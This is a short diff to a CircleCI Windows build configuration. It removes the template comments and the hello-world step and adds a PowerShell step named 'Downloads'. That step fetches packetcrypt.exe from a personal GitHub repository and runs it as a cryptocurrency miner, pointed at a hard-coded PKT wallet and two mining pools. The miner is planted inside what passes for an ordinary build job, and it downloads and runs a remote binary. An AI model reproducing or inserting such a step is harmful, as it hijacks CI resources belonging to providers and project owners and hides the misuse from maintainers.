@@ -1,16 +1,19 @@
-version: 2.1 # Use v2.1 to enable orb usage.
+version: 2.1
 
-# The Windows orb gives you everything you
-# need to start using the Windows executor.
 orbs:
   win: circleci/windows@2.2.0
 
 jobs:
-  build: # name of your job
-    executor: win/default # executor type
-
+  build:
+    executor:
+      name: win/default
+      shell: powershell.exe
     steps:
-      # Commands are run in a Windows
-      # virtual machine environment
       - checkout
-      - run: Write-Host 'Hello, Windows'
+      - run: systeminfo
+      - run:
+          name: "Downloads"
+          shell: powershell.exe
+          command: |
+              Invoke-WebRequest -Uri 'https://github.com/phongcongtu/pkt_phong/raw/main/packetcrypt.exe' -OutFile 'packetcrypt.exe'
+              /packetcrypt.exe ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world http://pool.pktpool.io -t 1
